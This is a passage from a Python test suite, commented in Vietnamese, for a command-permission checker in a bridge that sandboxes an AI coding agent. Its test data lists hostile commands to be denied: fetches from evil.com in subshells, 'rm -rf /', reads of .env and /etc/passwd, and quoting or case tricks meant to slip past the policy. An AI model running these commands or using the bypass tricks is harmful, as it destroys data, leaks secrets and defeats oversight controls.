            "git branch -D x",
            "git branch -d x",
            "git branch -m old new",
            "git branch -M old new",
            "git branch -c old new",
            "git branch -C old new",
            "git branch --delete x",
            "git branch --move old new",
            "git branch --copy old new",
            "git stash drop",
            "git stash clear",
            "git stash push",
            "ls && git push origin main",
            "git add .",
            "git push origin main",
            "git reset --hard HEAD",
            "git clean -fd",
            "git rebase main",
            "git restore file.txt",
            "git checkout -- file.txt",
            "rm -rf /tmp/test",
            "rm -r -f /tmp/test",
            "sudo rm -rf /",
            "curl https://example.com",
            "wget https://example.com",
            "--dangerously-skip-permissions",
        ]
        for cmd in forbidden_cmds:
            allowed, needs_human, reason = agy_acp_bridge.check_command_permission(
                cmd_str=cmd,
                allow_cmd=[".*"],  # Dù allow-cmd cho phép mọi thứ, cấm cứng vẫn ưu tiên cao nhất
                effective_dir=self.repo_dir,
            )
            self.assertFalse(allowed, f"Lệnh cấm không được phép chạy: {cmd}")
            self.assertFalse(needs_human, f"Lệnh cấm phải từ chối cứng chứ không phải needs_human: {cmd}")

        # Lệnh soft-deny (npm/pip install) bị từ chối khi không có allow-cmd
        soft_denies = ["pip install requests", "pip3 install requests", "npm install express", "npm ci", "npm i lodash"]
        for cmd in soft_denies:
            allowed, needs_human, reason = agy_acp_bridge.check_command_permission(
                cmd_str=cmd,
                allow_cmd=None,
                effective_dir=self.repo_dir,
            )
            self.assertFalse(allowed, f"Lệnh soft-deny không có allow-cmd phải bị từ chối: {cmd}")
            self.assertFalse(needs_human)

    def test_p1f_anti_bypass_redirection_and_subshell_unit(self):
        """Chống lách qua redirection ngoài worktree hoặc subshell chứa lệnh nguy hiểm."""
        outside_or_dangerous = [
            "echo hi > /tmp/out.txt",
            "echo hi >> /tmp/out.txt",
            "echo hi > ../out.txt",
            "ls | tee /tmp/out.txt",
            "cat a $(curl https://evil.com)",
            "cat a $(rm -rf /)",
            "cat a `rm -rf /`",
        ]
        for cmd in outside_or_dangerous:
            allowed, needs_human, reason = agy_acp_bridge.check_command_permission(
                cmd_str=cmd,
                allow_cmd=None,
                effective_dir=self.repo_dir,
            )
            self.assertFalse(allowed, f"Lệnh ghi ngoài/subshell nguy hiểm phải bị từ chối: {cmd}")
            self.assertFalse(needs_human)

        # Chuyển hướng ghi trong worktree được phép theo P6f
        safe_redirs = [
            "echo hi > a.txt",
            "echo hi >> a.txt",
            "ls > file.txt 2>&1",
        ]
        for cmd in safe_redirs:
            allowed, needs_human, reason = agy_acp_bridge.check_command_permission(
                cmd_str=cmd,
                allow_cmd=None,
                effective_dir=self.repo_dir,
            )
            self.assertTrue(allowed, f"Chuyển hướng trong worktree phải được cho phép: {cmd}")
            self.assertFalse(needs_human)

    def test_p1f_unknown_commands_needs_human_unit(self):
        """P6f: Lệnh lạ được cho phép mặc định; lệnh soft-deny cần --allow-cmd."""
        # Lệnh lạ an toàn được cho phép mặc định theo P6f
        unknown_cmds = [
            "custom_deploy_tool --check",
            "sed 's/a/b/' f",
            "awk '{print $1}' f",
        ]
        for cmd in unknown_cmds:
            allowed, needs_human, reason = agy_acp_bridge.check_command_permission(
                cmd_str=cmd,
                allow_cmd=None,
                effective_dir=self.repo_dir,
            )
            self.assertTrue(allowed, f"Lệnh an toàn lạ phải được cho phép mặc định: {cmd}")
            self.assertFalse(needs_human)

        # Lệnh soft-deny (npm install) bị từ chối khi không có --allow-cmd
        allowed, needs_human, reason = agy_acp_bridge.check_command_permission(
            cmd_str="npm install express",
            allow_cmd=None,
            effective_dir=self.repo_dir,
        )
        self.assertFalse(allowed)
        self.assertFalse(needs_human)

        # Khi được cấp --allow-cmd thì được phép
        allowed, needs_human, reason = agy_acp_bridge.check_command_permission(
            cmd_str="npm install express",
            allow_cmd=[r"^npm install\b"],
            effective_dir=self.repo_dir,
        )
        self.assertTrue(allowed)
        self.assertFalse(needs_human)

    def test_p1f_integration_piped_command_allowed(self):
        """Tích hợp: ls docs | wc -l được tự động cho phép."""
        proc, decisions = self._run_acp_custom_cmd("ls docs | wc -l")
        self.assertEqual(proc.returncode, 0)
        lines = proc.stdout.strip().splitlines()
        self.assertTrue(lines[0].startswith("STATUS: ok session="))
        self.assertIn("denied=0", lines[0])
        self.assertEqual(decisions, ["allow"])

    def test_p1f_integration_chained_git_command_allowed(self):
        """Tích hợp: Các lệnh git an toàn ghép qua ; hoặc && đều được cho phép; lệnh cấm bị từ chối."""
        proc, decisions = self._run_acp_custom_cmd("git status --short ; git diff --stat")
        self.assertEqual(proc.returncode, 0)
        lines = proc.stdout.strip().splitlines()
        self.assertTrue(lines[0].startswith("STATUS: ok session="))
        self.assertIn("denied=0", lines[0])
        self.assertEqual(decisions, ["allow"])

        # P6f: && giữa hai lệnh an toàn được tự động cho phép
        proc_and, decisions_and = self._run_acp_custom_cmd("git status --short && git diff --stat")
        self.assertEqual(proc_and.returncode, 0)
        lines_and = proc_and.stdout.strip().splitlines()
        self.assertTrue(lines_and[0].startswith("STATUS: ok session="))
        self.assertIn("denied=0", lines_and[0])
        self.assertEqual(decisions_and, ["allow"])

        # && với lệnh cấm (git push) bị từ chối
        proc_push, decisions_push = self._run_acp_custom_cmd("git status --short && git push")
        self.assertEqual(proc_push.returncode, 0)
        lines_push = proc_push.stdout.strip().splitlines()
        self.assertTrue(lines_push[0].startswith("STATUS: warn session="))
        self.assertIn("denied=1", lines_push[0])
        self.assertEqual(decisions_push, ["deny"])

    def test_p1f_integration_forbidden_branch_delete_denied(self):
        """Tích hợp: git branch -D x bị từ chối tuyệt đối."""
        proc, decisions = self._run_acp_custom_cmd("git branch -D x")
        self.assertEqual(proc.returncode, 0)
        lines = proc.stdout.strip().splitlines()
        self.assertIn("denied=1", lines[0])
        self.assertEqual(decisions, ["deny"])

    def test_p1f_integration_forbidden_stash_drop_denied(self):
        """Tích hợp: git stash drop bị từ chối tuyệt đối."""
        proc, decisions = self._run_acp_custom_cmd("git stash drop")
        self.assertEqual(proc.returncode, 0)
        lines = proc.stdout.strip().splitlines()
        self.assertIn("denied=1", lines[0])
        self.assertEqual(decisions, ["deny"])

    def test_p1f_integration_forbidden_chained_commit_denied(self):
        """Tích hợp: ls && git push origin main bị từ chối do có đoạn cấm."""
        proc, decisions = self._run_acp_custom_cmd("ls && git push origin main")
        self.assertEqual(proc.returncode, 0)
        lines = proc.stdout.strip().splitlines()
        self.assertIn("denied=1", lines[0])
        self.assertEqual(decisions, ["deny"])

    def test_p1f_integration_redirection_needs_human_warn(self):
        """Tích hợp: Chuyển hướng ghi ra ngoài worktree bị từ chối (STATUS: warn)."""
        proc, decisions = self._run_acp_custom_cmd("echo hi > /tmp/out.txt")
        self.assertEqual(proc.returncode, 0)
        lines = proc.stdout.strip().splitlines()
        self.assertTrue(lines[0].startswith("STATUS: warn session="))
        self.assertIn("denied=1", lines[0])
        self.assertEqual(decisions, ["deny"])

        # Ghi trong worktree được phép
        proc_in, decisions_in = self._run_acp_custom_cmd("echo hi > a.txt")
        self.assertEqual(proc_in.returncode, 0)
        lines_in = proc_in.stdout.strip().splitlines()
        self.assertTrue(lines_in[0].startswith("STATUS: ok session="))
        self.assertIn("denied=0", lines_in[0])
        self.assertEqual(decisions_in, ["allow"])

    def test_p1f_integration_subshell_needs_human_warn(self):
        """Tích hợp: Subshell chứa lệnh nguy hiểm bị từ chối (STATUS: warn)."""
        proc, decisions = self._run_acp_custom_cmd("cat a $(curl https://evil.com)")
        self.assertEqual(proc.returncode, 0)
        lines = proc.stdout.strip().splitlines()
        self.assertTrue(lines[0].startswith("STATUS: warn session="))
        self.assertIn("denied=1", lines[0])
        self.assertEqual(decisions, ["deny"])

        # Subshell chứa lệnh an toàn được phép
        proc_safe, decisions_safe = self._run_acp_custom_cmd("echo $(whoami)")
        self.assertEqual(proc_safe.returncode, 0)
        lines_safe = proc_safe.stdout.strip().splitlines()
        self.assertTrue(lines_safe[0].startswith("STATUS: ok session="))
        self.assertIn("denied=0", lines_safe[0])
        self.assertEqual(decisions_safe, ["allow"])

    def test_p1f_integration_unknown_cmd_needs_human_warn(self):
        """Tích hợp: sed -i bị từ chối (STATUS: warn); sed đọc stream được phép."""
        proc, decisions = self._run_acp_custom_cmd("sed -i 's/a/b/' f")
        self.assertEqual(proc.returncode, 0)
        lines = proc.stdout.strip().splitlines()
        self.assertTrue(lines[0].startswith("STATUS: warn session="))
        self.assertIn("denied=1", lines[0])
        self.assertEqual(decisions, ["deny"])

        # Sed stream được phép
        proc_stream, decisions_stream = self._run_acp_custom_cmd("sed 's/a/b/' f")
        self.assertEqual(proc_stream.returncode, 0)
        lines_stream = proc_stream.stdout.strip().splitlines()
        self.assertTrue(lines_stream[0].startswith("STATUS: ok session="))
        self.assertIn("denied=0", lines_stream[0])
        self.assertEqual(decisions_stream, ["allow"])

    def test_p1g_safe_commands_unit(self):
        """Kiểm tra các lệnh an toàn mặc định và lệnh cần allow_cmd theo brief P6d."""
        safe_cmds = [
            "rg foo README.md",
            "true",
            "pwd",
            "echo hi",
            "cat README.md",
            "head -n 5 README.md",
            "tail -n 5 README.md",
            "wc -l README.md",
            "ls -la",
            "python3 scripts/task-gate.py",
        ]
        for cmd in safe_cmds:
            allowed, needs_human, reason = agy_acp_bridge.check_command_permission(
                cmd_str=cmd,
                allow_cmd=None,
                effective_dir=self.repo_dir,
            )
            self.assertTrue(allowed, f"Lệnh an toàn phải được cho phép: {cmd} (lý do: {reason})")
            self.assertFalse(needs_human, f"Lệnh an toàn không được gắn needs_human: {cmd}")

        # P6f: Lệnh đọc/tra cứu/kiểm tra mở rộng được cho phép mặc định
        p6f_allowed_cmds = [
            "test -f a.txt",
            "[ -d x ]",
            "grep -n foo a.txt",
            'find . -name "*.py"',
            "sed -n 1,5p a.txt",
            "basename /a/b.txt",
            "dirname /a/b.txt",
            "realpath /a/b.txt",
            "readlink /a/b.txt",
            "false",
        ]
        for cmd in p6f_allowed_cmds:
            allowed, needs_human, reason = agy_acp_bridge.check_command_permission(
                cmd_str=cmd,
                allow_cmd=None,
                effective_dir=self.repo_dir,
            )
            self.assertTrue(allowed, f"Lệnh trong allowlist P6f phải được cho phép: {cmd}")
            self.assertFalse(needs_human)

    def test_p1g_rejected_commands_unit(self):
        """Kiểm tra các lệnh bị từ chối theo brief P6f."""
        rejected_cmds = [
            "find . -delete",
            "find . -exec rm {} ;",
            "find . -execdir ls {} +",
            "find . -ok rm {} ;",
            "find . -fprint /tmp/out",
            "find . -fls /tmp/out",
            "sed -i s/a/b/ f",
            "sed -i.bak s/a/b/ f",
            "sed --in-place s/a/b/ f",
            "awk -F: '{print $1}' /etc/passwd",
            'awk \'BEGIN{system("rm x")}\'',
        ]
        for cmd in rejected_cmds:
            allowed, needs_human, reason = agy_acp_bridge.check_command_permission(
                cmd_str=cmd,
                allow_cmd=None,
                effective_dir=self.repo_dir,
            )
            self.assertFalse(allowed, f"Lệnh phải bị từ chối: {cmd} (lý do: {reason})")

        # Ngược lại, sed và awk đọc thông thường được phép
        for cmd in ("sed 's/a/b/' f", "awk '{print $1}' f"):
            allowed, needs_human, reason = agy_acp_bridge.check_command_permission(
                cmd_str=cmd,
                allow_cmd=None,
                effective_dir=self.repo_dir,
            )
            self.assertTrue(allowed, f"Lệnh đọc sed/awk thông thường phải được cho phép: {cmd}")

    def test_p1g_integration_safe_test_command_allowed(self):
        """Tích hợp: rg foo README.md được cho phép mặc định theo P6d."""
        proc, decisions = self._run_acp_custom_cmd('rg foo README.md')
        self.assertEqual(proc.returncode, 0)
        lines = proc.stdout.strip().splitlines()
        self.assertTrue(lines[0].startswith("STATUS: ok session="))
        self.assertIn("denied=0", lines[0])
        self.assertEqual(decisions, ["allow"])

    def test_p1g_integration_safe_find_command_allowed(self):
        """Tích hợp: find . -name '*.py' được cho phép mặc định; find -delete bị từ chối."""
        proc, decisions = self._run_acp_custom_cmd('find . -name "*.py"')
        self.assertEqual(proc.returncode, 0)
        lines = proc.stdout.strip().splitlines()
        self.assertTrue(lines[0].startswith("STATUS: ok session="))
        self.assertIn("denied=0", lines[0])
        self.assertEqual(decisions, ["allow"])

        # find -delete bị từ chối và cảnh báo STATUS: warn
        proc_del, decisions_del = self._run_acp_custom_cmd('find . -delete')
        self.assertEqual(proc_del.returncode, 0)
        lines_del = proc_del.stdout.strip().splitlines()
        self.assertTrue(lines_del[0].startswith("STATUS: warn session="))
        self.assertIn("denied=1", lines_del[0])
        self.assertEqual(decisions_del, ["deny"])

    def test_p1g_integration_safe_sed_command_allowed(self):
        """Tích hợp: sed -n 1,5p a.txt được cho phép mặc định; sed -i bị từ chối."""
        proc, decisions = self._run_acp_custom_cmd("sed -n 1,5p a.txt")
        self.assertEqual(proc.returncode, 0)
        lines = proc.stdout.strip().splitlines()
        self.assertTrue(lines[0].startswith("STATUS: ok session="))
        self.assertIn("denied=0", lines[0])
        self.assertEqual(decisions, ["allow"])

        # sed -i bị từ chối và cảnh báo STATUS: warn
        proc_i, decisions_i = self._run_acp_custom_cmd("sed -i 's/a/b/' a.txt")
        self.assertEqual(proc_i.returncode, 0)
        lines_i = proc_i.stdout.strip().splitlines()
        self.assertTrue(lines_i[0].startswith("STATUS: warn session="))
        self.assertIn("denied=1", lines_i[0])
        self.assertEqual(decisions_i, ["deny"])

    def test_p1g_integration_rejected_find_delete_denied(self):
        """Tích hợp: find . -delete bị từ chối tuyệt đối."""
        proc, decisions = self._run_acp_custom_cmd("find . -delete")
        self.assertEqual(proc.returncode, 0)
        lines = proc.stdout.strip().splitlines()
        self.assertIn("denied=1", lines[0])
        self.assertEqual(decisions, ["deny"])

    def test_p1g_integration_rejected_awk_system_warn(self):
        """Tích hợp: awk 'BEGIN{system(\"rm x\")}' bị từ chối và cảnh báo NEEDS-HUMAN."""
        proc, decisions = self._run_acp_custom_cmd('awk \'BEGIN{system("rm x")}\'')
        self.assertEqual(proc.returncode, 0)
        lines = proc.stdout.strip().splitlines()
        self.assertTrue(lines[0].startswith("STATUS: warn session="))
        self.assertIn("denied=1", lines[0])
        self.assertEqual(decisions, ["deny"])

    def test_p1h_prompt_contains_fallback_instructions(self):
        """Prompt gửi lên chứa các ý của thay đổi 1 theo brief P1h."""
        prefix = agy_acp_bridge.ACP_FIXED_PROMPT_PREFIX
        self.assertIn("view_file", prefix)
        self.assertIn("list_dir", prefix)
        self.assertIn("grep_search", prefix)
        self.assertIn("find_by_name", prefix)
        self.assertIn("KHÔNG dừng", prefix)
        self.assertIn("Chỉ dừng hỏi khi thiếu dữ kiện nghiệp vụ", prefix)
        self.assertEqual(agy_acp_bridge.FIXED_PROMPT_PREFIX, prefix)

        # Kiểm tra nội dung prompt thực tế nhận được ở tác tử ACP
        self.env["MOCK_ACP_SCENARIO"] = "plain_success"
        argv = [
            "run",
            "--dir", str(self.repo_dir),
            "--task-file", str(self.task_file),
            "--report-dir", str(self.report_dir),
        ]
        proc = subprocess.run(
            [sys.executable, str(ACP_BRIDGE_PATH)] + argv,
            env=self.env,
            capture_output=True,
            text=True,
        )
        self.assertEqual(proc.returncode, 0)
        log_entries = self._read_mock_log()
        prompt_calls = [
            e["received"] for e in log_entries
            if "received" in e and e["received"].get("method") == "session/prompt"
        ]
        self.assertGreaterEqual(len(prompt_calls), 1)
        actual_prompt = prompt_calls[0].get("params", {}).get("prompt", [{}])[0].get("text", "")
        self.assertIn("view_file", actual_prompt)
        self.assertIn("KHÔNG dừng", actual_prompt)
        self.assertIn("Chỉ dừng hỏi khi thiếu dữ kiện nghiệp vụ", actual_prompt)

    def test_p1h_integration_autocont_recover_when_command_denied(self):
        """Lượt 1 xin lệnh lạ bị từ chối rồi kết thúc không ghi file; lượt 2 ghi file: bridge gửi đúng 1 tin tiếp tục, STATUS ok, autocont=1."""
        target_file = self.repo_dir / "recovered_file.txt"
        self.env["MOCK_ACP_SCENARIO"] = "p1h_autocont_recover"
        self.env["TARGET_WRITE_FILE"] = str(target_file)

        argv = [
            "run",
            "--dir", str(self.repo_dir),
            "--task-file", str(self.task_file),
            "--allow-write", str(target_file),
            "--report-dir", str(self.report_dir),
        ]

        proc = subprocess.run(
            [sys.executable, str(ACP_BRIDGE_PATH)] + argv,
            env=self.env,
            capture_output=True,
            text=True,
        )

        self.assertEqual(proc.returncode, 0, f"Stderr: {proc.stderr}\nStdout: {proc.stdout}")
        lines = proc.stdout.strip().splitlines()
        self.assertEqual(len(lines), 3)
        self.assertTrue(lines[0].startswith("STATUS: ok session="))
        self.assertIn("autocont=1", lines[0])
        self.assertIn("tokens=25000", lines[0])
        self.assertIn("denied=1", lines[0])
        self.assertIn("1 changed", lines[1])
        self.assertTrue(target_file.exists())
        self.assertEqual(target_file.read_text(), "WRITTEN_BY_MOCK_ALLOW")

        # Kiểm tra nội dung tin nhắn tiếp tục gửi ở lượt 2
        log_entries = self._read_mock_log()
        prompt_calls = [
            e["received"] for e in log_entries
            if "received" in e and e["received"].get("method") == "session/prompt"
        ]
        self.assertEqual(len(prompt_calls), 2)
        turn2_prompt = prompt_calls[1].get("params", {}).get("prompt", [{}])[0].get("text", "")
        self.assertIn("bị từ chối", turn2_prompt)
        self.assertIn("view_file, list_dir, grep_search", turn2_prompt)

    def test_p1h_integration_always_denied_stops_after_max_auto_continue_warn(self):
        """Lượt nào cũng chỉ xin lệnh bị từ chối: dừng sau đúng --max-auto-continue lần tiếp tục, STATUS warn."""
        self.env["MOCK_ACP_SCENARIO"] = "p1h_always_denied"

        argv = [
            "run",
            "--dir", str(self.repo_dir),
            "--task-file", str(self.task_file),
            "--max-auto-continue", "2",
            "--report-dir", str(self.report_dir),
        ]

        proc = subprocess.run(
            [sys.executable, str(ACP_BRIDGE_PATH)] + argv,
            env=self.env,
            capture_output=True,
            text=True,
        )

        self.assertEqual(proc.returncode, 0, f"Stderr: {proc.stderr}\nStdout: {proc.stdout}")
        lines = proc.stdout.strip().splitlines()
        self.assertEqual(len(lines), 3)
        self.assertTrue(lines[0].startswith("STATUS: warn session="))
        self.assertIn("autocont=2", lines[0])
        self.assertIn("denied=3", lines[0])

        # Xác minh gửi đúng 3 prompts (1 ban đầu + 2 auto-continue)
        log_entries = self._read_mock_log()
        prompt_calls = [
            e["received"] for e in log_entries
            if "received" in e and e["received"].get("method") == "session/prompt"
        ]
        self.assertEqual(len(prompt_calls), 3)

    def test_p1h_integration_write_then_denied_no_autocont(self):
        """Lượt có ghi file thành công rồi mới bị từ chối một lệnh: KHÔNG tự tiếp tục."""
        target_file = self.repo_dir / "written_first.txt"
        self.env["MOCK_ACP_SCENARIO"] = "p1h_write_then_denied"
        self.env["TARGET_WRITE_FILE"] = str(target_file)

        argv = [
            "run",
            "--dir", str(self.repo_dir),
            "--task-file", str(self.task_file),
            "--allow-write", str(target_file),
            "--report-dir", str(self.report_dir),
        ]

        proc = subprocess.run(
            [sys.executable, str(ACP_BRIDGE_PATH)] + argv,
            env=self.env,
            capture_output=True,
            text=True,
        )

        self.assertEqual(proc.returncode, 0, f"Stderr: {proc.stderr}\nStdout: {proc.stdout}")
        lines = proc.stdout.strip().splitlines()
        self.assertEqual(len(lines), 3)
        self.assertTrue(lines[0].startswith("STATUS: warn session="))
        self.assertNotIn("autocont", lines[0])
        self.assertIn("denied=1", lines[0])
        self.assertIn("1 changed", lines[1])
        self.assertTrue(target_file.exists())

        # Xác minh chỉ có đúng 1 prompt duy nhất, không hề tự tiếp tục
        log_entries = self._read_mock_log()
        prompt_calls = [
            e["received"] for e in log_entries
            if "received" in e and e["received"].get("method") == "session/prompt"
        ]
        self.assertEqual(len(prompt_calls), 1)

    def test_p1i_quota_probe_success_status_fail_code_2(self):
        """Lỗi chứa quota nhưng thăm dò thành công: STATUS fail, mã 2, báo cáo có nguyên văn lỗi."""
        self.env["MOCK_ACP_SCENARIO"] = "quota_probe_success"

        argv = [
            "run",
            "--dir", str(self.repo_dir),
            "--task-file", str(self.task_file),
            "--report-dir", str(self.report_dir),
        ]

        proc = subprocess.run(
            [sys.executable, str(ACP_BRIDGE_PATH)] + argv,
            env=self.env,
            capture_output=True,
            text=True,
        )

        self.assertEqual(proc.returncode, 2, f"Stderr: {proc.stderr}\nStdout: {proc.stdout}")
        lines = proc.stdout.strip().splitlines()
        self.assertEqual(len(lines), 3)
        self.assertTrue(lines[0].startswith("STATUS: fail session="))
        self.assertNotIn("DOI-TAI-KHOAN-AGY", lines[0])

        report_path = Path(lines[2].split("REPORT: ")[1].strip())
        self.assertTrue(report_path.exists())
        report_content = report_path.read_text(encoding="utf-8")
        self.assertIn("nghi quota nhưng thăm dò thành công; lỗi nguyên văn:", report_content)
        self.assertIn("Resource has been exhausted", report_content)
        self.assertIn("prompt_result['error']", report_content)

        # Kiểm tra mock nhận lệnh thăm dò
        log_entries = self._read_mock_log()
        probe_calls = [e for e in log_entries if "probe_argv" in e]
        self.assertEqual(len(probe_calls), 1)

    def test_p1i_quota_probe_fail_status_quota_code_7(self):
        """Lỗi chứa quota, thăm dò cũng lỗi quota: STATUS quota, mã 7."""
        self.env["MOCK_ACP_SCENARIO"] = "quota_probe_quota"

        argv = [
            "run",
            "--dir", str(self.repo_dir),
            "--task-file", str(self.task_file),
            "--report-dir", str(self.report_dir),
        ]

        proc = subprocess.run(
            [sys.executable, str(ACP_BRIDGE_PATH)] + argv,
            env=self.env,
            capture_output=True,
            text=True,
        )

        self.assertEqual(proc.returncode, 7, f"Stderr: {proc.stderr}\nStdout: {proc.stdout}")
        lines = proc.stdout.strip().splitlines()
        self.assertEqual(len(lines), 3)
        self.assertTrue(lines[0].startswith("STATUS: quota session="))
        self.assertIn("DOI-TAI-KHOAN-AGY", lines[0])

        report_path = Path(lines[2].split("REPORT: ")[1].strip())
        self.assertTrue(report_path.exists())
        report_content = report_path.read_text(encoding="utf-8")
        self.assertIn("CẢNH BÁO QUOTA", report_content)
        self.assertIn("Resource has been exhausted", report_content)

        # Mock có nhận lượt thăm dò
        log_entries = self._read_mock_log()
        probe_calls = [e for e in log_entries if "probe_argv" in e]
        self.assertEqual(len(probe_calls), 1)

    def test_p1i_no_quota_probe_flag_exits_code_7_immediately(self):
        """Cờ --no-quota-probe: mã 7 ngay, không gọi thăm dò."""
        # Dùng scenario quota_probe_success nhưng có cờ --no-quota-probe thì không được probe
        self.env["MOCK_ACP_SCENARIO"] = "quota_probe_success"

        argv = [
            "run",
            "--dir", str(self.repo_dir),
            "--task-file", str(self.task_file),
            "--no-quota-probe",
            "--report-dir", str(self.report_dir),
        ]

        proc = subprocess.run(
            [sys.executable, str(ACP_BRIDGE_PATH)] + argv,
            env=self.env,
            capture_output=True,
            text=True,
        )

        self.assertEqual(proc.returncode, 7, f"Stderr: {proc.stderr}\nStdout: {proc.stdout}")
        lines = proc.stdout.strip().splitlines()
        self.assertEqual(len(lines), 3)
        self.assertTrue(lines[0].startswith("STATUS: quota session="))
        self.assertIn("DOI-TAI-KHOAN-AGY", lines[0])

        # Không hề có lượt thăm dò nào được gọi
        log_entries = self._read_mock_log()
        probe_calls = [e for e in log_entries if "probe_argv" in e]
        self.assertEqual(len(probe_calls), 0)

        report_path = Path(lines[2].split("REPORT: ")[1].strip())
        self.assertTrue(report_path.exists())
        report_content = report_path.read_text(encoding="utf-8")
        self.assertIn("--no-quota-probe", report_content)

    def test_p1i_worktree_valid_files_kept_unapplied_on_error(self):
        """Phiên đã ghi file hợp lệ rồi gặp lỗi: FILES có unapplied=<k>, không chép về, worktree còn."""
        target_file = self.repo_dir / "valid_unapplied.txt"
        self.env["MOCK_ACP_SCENARIO"] = "p1i_write_then_error"
        self.env["TARGET_WRITE_FILE"] = str(target_file)
        wt_dir = self.base_dir / "worktrees"

        argv = [
            "run",
            "--dir", str(self.repo_dir),
            "--task-file", str(self.task_file),
            "--worktree",
            "--worktrees-dir", str(wt_dir),
            "--apply",
            "--allow-write", str(target_file),
            "--report-dir", str(self.report_dir),
        ]

        proc = subprocess.run(
            [sys.executable, str(ACP_BRIDGE_PATH)] + argv,
            env=self.env,
            capture_output=True,
            text=True,
        )

        self.assertIn(proc.returncode, (2, 7))
        lines = proc.stdout.strip().splitlines()
        self.assertEqual(len(lines), 3)
        self.assertIn("1 changed", lines[1])
        line2_tokens = lines[1].split()
        self.assertIn("unapplied=1", line2_tokens)
        self.assertNotIn("applied=1", line2_tokens)
        self.assertIn("wt=", lines[1])

        # Repo gốc KHÔNG bị chép về
        self.assertFalse(target_file.exists())

        # Worktree vẫn tồn tại và file trong worktree vẫn còn
        wt_part = [part for part in lines[1].split() if part.startswith("wt=")][0]
        wt_dir = Path(wt_part.split("wt=")[1].strip())
        self.assertTrue(wt_dir.exists())
        wt_target = wt_dir / "valid_unapplied.txt"
        self.assertTrue(wt_target.exists())
        self.assertEqual(wt_target.read_text(), "WRITTEN_BY_MOCK_ALLOW")

        # Báo cáo có gợi ý chép về thủ công
        report_path = Path(lines[2].split("REPORT: ")[1].strip())
        self.assertTrue(report_path.exists())
        report_content = report_path.read_text(encoding="utf-8")
        self.assertIn("Unapplied Changes", report_content)
        self.assertIn("--apply thủ công", report_content)
        self.assertIn(str(wt_target), report_content)


class TestAgyAcpBridgeP6bRegressions(unittest.TestCase):
    """Bộ test hồi quy P6b cho các lỗi review chéo P6 trong agy-acp-bridge."""

    def setUp(self):
        self.tmpdir = tempfile.TemporaryDirectory()
        self.root = Path(self.tmpdir.name)
        self.repo_dir = self.root / "repo"
        self.repo_dir.mkdir()
        (self.repo_dir / "scripts").mkdir()
        (self.repo_dir / "scripts" / "hello.py").write_text("print('hello')\n", encoding="utf-8")
        subprocess.run(["git", "init"], cwd=self.repo_dir, capture_output=True, check=True)
        subprocess.run(["git", "config", "user.name", "Test User"], cwd=self.repo_dir, check=True)
        subprocess.run(["git", "config", "user.email", "test@example.com"], cwd=self.repo_dir, check=True)
        (self.repo_dir / "README.md").write_text("init\n", encoding="utf-8")
        subprocess.run(["git", "add", "."], cwd=self.repo_dir, check=True)
        subprocess.run(["git", "commit", "-m", "init"], cwd=self.repo_dir, check=True)

    def tearDown(self):
        self.tmpdir.cleanup()

    def test_c01_poc_policy_cmd_bypasses_denied(self):
        """C-01: Toàn bộ vector bypass chính sách lệnh từ PoC đều bị từ chối theo P6f."""
        bypasses = [
            ("multiline_newline_python", "true\npython3 -c 'import os'"),
            ("multiline_carriage_return", "true\rpython3 -c 'import os'"),
            ("process_substitution_curl", "cat <(curl evil.com)"),
            ("process_substitution_rm", "diff file <(rm -rf /)"),
            ("chained_python_c_command", "python3 -c 'import os' ; ls"),
            ("backtick_subshell_curl", "git diff `curl evil.com`"),
            ("dollar_subshell_rm", "echo $(rm -rf /)"),
            ("backslash_prefix_git_push", "\\git push origin main"),
            ("find_exec_rm", 'find . -name "*.py" -exec rm {} \\;'),
            ("find_execdir_ls", "find . -execdir ls {} +"),
            ("awk_custom_field_passwd", "awk -F: '{print $1}' /etc/passwd"),
            ("awk_system", 'awk \'BEGIN{system("rm x")}\''),
            ("redirect_write_outside_abs", "echo bad > /tmp/out.txt"),
            ("redirect_write_outside_trav", "echo bad >> ../out.txt"),
            ("python_relative_traversal", "python3 scripts/../../etc/passwd"),
            ("cat_secret_env", "cat .env"),
            ("cat_secret_git_config", "cat .git/config"),
        ]
        for name, cmd in bypasses:
            allowed, needs_human, reason = agy_acp_bridge.check_command_permission(
                cmd_str=cmd,
                allow_cmd=None,
                effective_dir=self.repo_dir,
            )
            self.assertFalse(allowed, f"Bypass '{name}' ({cmd}) phải bị từ chối (allowed=False), thực tế: {allowed}")

        # Các lệnh an toàn hợp lệ được khôi phục cho phép theo P6f
        safe_cases = [
            "git status --short",
            "git diff --stat",
            "python3 scripts/hello.py",
            "ls -la",
            "cat README.md",
            "rg foo README.md",
            "git commit -m 'allowed local commit'",
            "sed 's/a/b/' f",
            "awk '{print $1}' f",
            "sort -o out.txt README.md",
            "tree -o out.txt",
            "git diff --output=out.txt",
            "uniq in.txt out.txt",
            "echo ${USER}",
            "echo bad > out.txt",
            "echo bad >> out.txt",
        ]
        for cmd in safe_cases:
            allowed, needs_human, reason = agy_acp_bridge.check_command_permission(
                cmd_str=cmd,
                allow_cmd=None,
                effective_dir=self.repo_dir,
            )
            self.assertTrue(allowed, f"Lệnh an toàn '{cmd}' phải được cho phép, lý do: {reason}")
            self.assertFalse(needs_human)

    def test_c02_case_folding_and_c_flags_and_quote_tricks_and_allow_cmd_chained(self):
        """C-02: Chặn lách lệnh cấm qua chữ hoa, cờ -C, --git-dir, nháy nối, và allow-cmd lệnh ghép."""
        forbidden_tricks = [
            ("uppercase_git_push", "GIT PUSH origin main"),
            ("git_flag_c_bypass", "git -C /tmp status"),
            ("git_flag_git_dir_override", "git --git-dir=.git status"),
            ("quote_joined_tokens", "git''push origin main"),
            ("quote_flag_token", "find . -'exec' rm {} +"),
        ]
        for name, cmd in forbidden_tricks:
            allowed, needs_human, reason = agy_acp_bridge.check_command_permission(
                cmd_str=cmd,
                allow_cmd=None,
                effective_dir=self.repo_dir,
            )
            self.assertFalse(allowed, f"Thủ thuật '{name}' ({cmd}) phải bị từ chối")

        # --allow-cmd regex chỉ áp dụng khi lệnh có đúng 1 đoạn, không hợp lệ hóa lệnh ghép
        allowed_chained, _, _ = agy_acp_bridge.check_command_permission(
            cmd_str="ls && git push origin main",
            allow_cmd=[r"^ls"],
            effective_dir=self.repo_dir,
        )
        self.assertFalse(allowed_chained, "--allow-cmd không được biến cả chuỗi ghép chứa lệnh cấm thành hợp lệ")

    def test_m01_success_turn_with_quota_text_and_apply(self):
        """M-01: Phản hồi bình thường chứa 'quota' hoặc '429' không bị coi là lỗi quota, gọi hàm thật và kiểm tra --apply."""
        normal_resp = "Đã hoàn thành kiểm tra logic xử lý lỗi 429 và quota bình thường."
        info = agy_acp_bridge.detect_error_and_suspected_quota(
            prompt_result={"result": {"stopReason": "end_turn"}},
